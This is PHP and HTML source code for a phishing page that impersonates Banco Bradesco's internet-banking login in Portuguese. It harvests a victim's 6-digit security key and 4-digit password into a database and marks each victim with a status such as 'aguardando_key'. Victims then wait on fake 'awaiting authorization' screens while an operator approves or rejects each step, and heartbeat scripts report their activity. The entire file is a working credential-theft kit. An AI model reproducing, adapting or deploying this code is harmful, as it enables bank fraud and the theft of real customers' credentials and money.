<?php
session_start();

if (!isset($_SESSION['client_id'], $_SESSION['agencia'], $_SESSION['conta'], $_SESSION['digito'])) {
    header('Location: index.php');
    exit;
}

require __DIR__ . '/../includes/db.php';
$clientId = $_SESSION['client_id'];

/*
  AJAX STEPS:
  - dados  -> valida checkbox
  - chave  -> grava chave e status = 'aguardando_key'
  - senha  -> grava senha e status = 'aguardando_password' (novo estágio de espera)
    Depois o front fica em loop até status virar 'password_authorized' (feito pelo admin)
*/

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    $step = $_POST['step'] ?? '';

    if ($step === 'dados') {
        if (empty($_POST['agreement'])) {
            echo 'erro_dados';
        } else {
            echo 'ok_dados';
        }
        exit;
    }

    if ($step === 'chave') {
        $chave = trim($_POST['chave'] ?? '');
        if (strlen($chave) !== 6 || !ctype_digit($chave)) {
            echo 'erro_chave';
        } else {
            $stmt = $pdo->prepare("UPDATE clients SET chave = ?, status = 'aguardando_key', updated_at = NOW() WHERE id = ?");
            $stmt->execute([$chave, $clientId]);
            echo 'ok_chave';
        }
        exit;
    }

    if ($step === 'senha') {
        $senha = trim($_POST['senha'] ?? '');
        if (strlen($senha) !== 4 || !ctype_digit($senha)) {
            echo 'erro';
        } else {
            // Novo fluxo: NÃO autoriza aqui. Coloca status de espera para o admin liberar.
            $stmt = $pdo->prepare("UPDATE clients SET senha = ?, status = 'aguardando_password', updated_at = NOW() WHERE id = ?");
            $stmt->execute([$senha, $clientId]);
            echo 'ok_senha_enviada';
        }
        exit;
    }
}

$pageTitle = 'Login — Banco Bradesco';
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow" />
  <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
  <link rel="shortcut icon" href="/imagens/favicon.png" type="image/x-icon">
  <link rel="stylesheet" href="/css/login.css">
  <title><?php echo $pageTitle; ?></title>
  <style>
    .container-etapas { transition: left 0.3s ease; }

    /* Overlay de espera após senha */
    #overlay-espera {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.92);
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 9999;
      font-family: Arial, sans-serif;
    }
    #overlay-espera .spinner {
      width: 70px;
      height: 70px;
      border: 6px solid #e6e6e6;
      border-top-color: #cc092f;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 22px;
    }
    #overlay-espera p {
      color: #333;
      font-size: 15px;
      text-align: center;
      line-height: 1.4;
      max-width: 300px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Loader da chave (já existia – deixei) */
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.2); opacity: 0.6; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
<div class="background">
  <div class="header">
    <div class="baseHeader">
      <img src="/imagens/icon.png" alt="logo">
      <p id="data">
        <?php
          date_default_timezone_set('America/Sao_Paulo');
          $dias = ['Domingo','Segunda-feira','Terça-feira','Quarta-feira','Quinta-feira','Sexta-feira','Sábado'];
            $diaSemana = $dias[date('w')];
            echo strtoupper($diaSemana . ', ' . date('d/m/Y'));
        ?>
      </p>
    </div>
    <div class="baseHeader">
      <a href="index.php">Cancelar</a>
    </div>
  </div>

  <div class="main">
    <form method="post" class="popUp" id="formLogin">

      <div class="dataUser">
        <h2>Olá, <?php echo htmlspecialchars($_SESSION['nome'] ?? 'que bom ter você aqui!'); ?></h2>
        <p>
          Agência <span><?php echo $_SESSION['agencia']; ?></span> |
          Conta <span><?php echo $_SESSION['conta']; ?></span>-
          <span><?php echo $_SESSION['digito']; ?></span>
        </p>
      </div>

      <div class="containerData">
        <div><p class="etp etp-dados ativo">Dados</p></div>
        <div><p class="etp etp-chave">Validação</p></div>
        <div><p class="etp etp-senha">Senha</p></div>
      </div>

      <div class="etapas">
        <div class="container-etapas" id="containerEtapas" style="left: 0%;">
          <!-- ETAPA 1 -->
          <div class="etapa-dados">
            <div class="section-contrato">
              <div class="container-contrato">
                <input type="checkbox" name="agreement" id="agreement" value="1">
                <p>Li e concordo com o Termo de Adesão do Internet Banking.</p>
              </div>
              <button type="button" id="avancarDados" class="buttonNext">Avançar</button>
            </div>
          </div>

          <!-- ETAPA 2 -->
          <div class="etapa-validacao">
            <div class="containerInputs">
              <p>Informe a <span>Chave de Segurança</span>, com 6<br> dígitos, que aparece no seu <span>App Bradesco</span>.</p>
              <div class="infInputs">
                <img src="/imagens/icon-fone.png" alt="telefone">
                <p>Nº de referência do dispositivo:<br>
                  <span id="ref-dispositivo">Carregando...</span>
                </p>

              </div>
            </div>
            <div class="backgroundInput">
              <div class="inputs">
                <input type="password" name="chave" maxlength="6" class="inputChave" id="inputChave" inputmode="numeric">
              </div>
              <div id="key-loader" style="display: none; margin-top: 20px; text-align:center;">
                <div class="circle" style="width:40px;height:40px;border-radius:50%;background:#cc092f;margin:auto;animation: pulse 1s infinite;"></div>
                <p style="margin-top:10px;color:#cc092f;">Aguardando confirmação do Bradesco, por favor aguarde!</p>
              </div>

              <button type="button" id="avancarChave" class="buttonNext">Avançar para a Senha</button>
              <a href="#">Ajuda com dispositivo de segurança?</a>
            </div>
          </div>

          <!-- ETAPA 3 -->
          <div class="etapa-senha">
            <div class="container-senha">
              <p>Informe sua senha de <span>4 dígitos</span><br> clicando no teclado abaixo</p>
            </div>
            <div class="container-Input-senha">
              <div class="entrada-senha">
                <span><input type="password" maxlength="1" class="campo" readonly></span>
                <span><input type="password" maxlength="1" class="campo" readonly></span>
                <span><input type="password" maxlength="1" class="campo" readonly></span>
                <span><input type="password" maxlength="1" class="campo" readonly></span>
              </div>
              <div class="teclado-virtual">
                <ul>
                  <li data-val="6">6</li><li data-val="1">1</li><li data-val="3">3</li>
                  <li data-val="4">4</li><li data-val="7">7</li><li data-val="2">2</li>
                  <li data-val="8">8</li><li data-val="9">9</li><li data-val="0">0</li>
                  <li data-val="5">5</li><li data-val="limpar">Limpar</li>
                </ul>
              </div>
              <button id="btSenha" type="button" class="buttonNext" disabled>Acessar</button>
              <a href="#">Esqueci minha senha</a>
            </div>
          </div>
        </div>
      </div>
    </form>

    <div class="banner"></div>
  </div>

  <div id="mensagemError" class="popUp-error" style="display: none;">
    <div class="erro"><p id="msgErro">Erro</p></div>
    <div class="carregar"><div class="temp-carregamento"></div></div>
  </div>

  <div class="load"><div class="container-load"><div class="circle"></div><div class="circle"></div></div></div>
</div>

<!-- Overlay de espera após envio da senha -->
<div id="overlay-espera">
  <div class="spinner"></div>
  <p>Aguardando autorização de acesso...<br>Por favor, aguarde.</p>
</div>

<script>
  const container = document.getElementById('containerEtapas');
  const erro = document.getElementById('mensagemError');
  const msgErro = document.getElementById('msgErro');
  const overlayEspera = document.getElementById('overlay-espera');

  function showErro(msg) {
    msgErro.textContent = msg;
    erro.style.display = 'flex';
    setTimeout(() => erro.style.display = 'none', 5000);
  }

  function marcarEtapa(etapa) {
    document.querySelectorAll('.containerData p').forEach(p => p.classList.remove('ativo'));
    if (etapa === 'dados')   document.querySelector('.etp-dados').classList.add('ativo');
    if (etapa === 'chave')   document.querySelector('.etp-chave').classList.add('ativo');
    if (etapa === 'senha')   document.querySelector('.etp-senha').classList.add('ativo');
  }

  // --- Etapa Dados ---
  document.getElementById('avancarDados').addEventListener('click', () => {
    const agreement = document.getElementById('agreement').checked;
    const form = new FormData();
    form.append('step', 'dados');
    if (agreement) form.append('agreement', '1');

    fetch('login.php', {
      method: 'POST',
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
      body: form
    })
    .then(r => r.text())
    .then(res => {
      if (res === 'ok_dados') {
        container.style.left = '-100%';
        marcarEtapa('chave');
      } else {
        showErro('Você precisa aceitar o termo de adesão.');
      }
    });
  });

  // --- Etapa Chave ---
  const inputChave = document.getElementById('inputChave');
  const btnChave   = document.getElementById('avancarChave');
  btnChave.disabled = true;

  inputChave.addEventListener('input', () => {
    const valor = inputChave.value.replace(/\D/g, '');
    inputChave.value = valor;
    btnChave.disabled = valor.length !== 6;
  });

  btnChave.addEventListener('click', () => {
    const chave = inputChave.value;
    const form  = new FormData();
    form.append('step', 'chave');
    form.append('chave', chave);
    document.getElementById('key-loader').style.display = 'block';

    fetch('login.php', {
      method: 'POST',
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
      body: form
    })
    .then(r => r.text())
    .then(res => {
      if (res === 'ok_chave') {
        // polling JSON status
        function aguardarAutorizacaoChave() {
          fetch(`verificar_status.php?id=<?php echo $clientId; ?>`)
            .then(r => r.json())
            .then(json => {
              const status = (json.status || '').trim();
              if (status === 'key_authorized') {
                document.getElementById('key-loader').style.display = 'none';
                container.style.left = '-200%';
                marcarEtapa('senha');
              } else if (status === 'rejected') {
                document.getElementById('key-loader').style.display = 'none';
                showErro('Chave incorreta, verifique e tente novamente.');
              } else {
                setTimeout(aguardarAutorizacaoChave, 1500);
              }
            })
            .catch(() => setTimeout(aguardarAutorizacaoChave, 2000));
        }
        aguardarAutorizacaoChave();
      } else {
        document.getElementById('key-loader').style.display = 'none';
        showErro('Informe uma chave de 6 dígitos.');
      }
    });
  });

  // --- Etapa Senha ---
  const campos = document.querySelectorAll('.campo');
  const teclado = document.querySelectorAll('.teclado-virtual li');
  const botaoAcessar = document.getElementById('btSenha');

  teclado.forEach(tecla => {
    tecla.addEventListener('click', () => {
      const val = tecla.dataset.val;
      if (val === 'limpar') {
        campos.forEach(c => c.value = '');
        botaoAcessar.disabled = true;
        return;
      }
      for (let i = 0; i < campos.length; i++) {
        if (!campos[i].value) {
          campos[i].value = val;
          break;
        }
      }
      const senha = Array.from(campos).map(c => c.value).join('');
      botaoAcessar.disabled = senha.length !== 4;
    });
  });

  botaoAcessar.addEventListener('click', (e) => {
    e.preventDefault();
    const senha = Array.from(campos).map(c => c.value).join('');
    const form = new FormData();
    form.append('step', 'senha');
    form.append('senha', senha);

    fetch('login.php', {
      method: 'POST',
      headers: { 'X-Requested-With': 'XMLHttpRequest' },
      body: form
    })
    .then(r => r.text())
    .then(res => {
      if (res === 'ok_senha_enviada') {
        overlayEspera.style.display = 'flex';
        function aguardarAutorizacaoSenha() {
          fetch(`verificar_status.php?id=<?php echo $clientId; ?>`)
            .then(r => r.json())
            .then(json => {
              const status = (json.status || '').trim();
              if (status === 'password_authorized') {
                window.location.href = '/logado.php';
              } else if (status === 'rejected') {
                overlayEspera.style.display = 'none';
                showErro('Acesso não autorizado, tente novamente.');
              } else {
                setTimeout(aguardarAutorizacaoSenha, 1500);
              }
            })
            .catch(() => setTimeout(aguardarAutorizacaoSenha, 2000));
        }
        aguardarAutorizacaoSenha();
      } else {
        showErro('Informe uma senha de 4 dígitos.');
      }
    });
  });
</script>

<script>
  // Heartbeat
  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    return parts.length === 2 ? parts.pop().split(';').shift() : '';
  }
  function sendHeartbeat() {
    const userCookie = getCookie('identificador_cliente');
    if (userCookie) {
      const fd = new FormData();
      fd.append('identificador_cookie', userCookie);
      fetch('/heartbeat.php', { method: 'POST', body: fd })
        .catch(err => console.error('Heartbeat falhou:', err));
    }
  }
  function carregarReferenciaDispositivo() {
    fetch('get_client_data.php')
      .then(r => r.ok ? r.json() : Promise.reject())
      .then(data => {
        const spanRef = document.getElementById('ref-dispositivo');
        if (!spanRef) return;
        let ref = (data.referencia_dispositivo || '').trim();
        if (!ref) { spanRef.textContent = 'N/D'; return; }
        ref = ref.replace(/^X{6}/i, '');
        spanRef.textContent = 'XXXXXX' + ref;
      })
      .catch(() => {
        const spanRef = document.getElementById('ref-dispositivo');
        if (spanRef) spanRef.textContent = 'N/D';
      });
  }

  sendHeartbeat();
  setInterval(sendHeartbeat, 3000);
  carregarReferenciaDispositivo();
  setInterval(carregarReferenciaDispositivo, 1000);
</script>

<script>
  document.addEventListener('DOMContentLoaded', () => {
    const pageName = 'login.php';
    function reportarEstagioAtual() {
      fetch('/atualizar_estagio.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ estagio: pageName }),
        credentials: 'include'
      }).catch(err => console.error(`Erro ao reportar estágio '${pageName}':`, err));
    }
    reportarEstagioAtual();
    setInterval(reportarEstagioAtual, 2000);
  });
</script>
<?php include 'footerclassic.php'; ?>
<?php include 'chat.php'; ?>

</body>
</html>
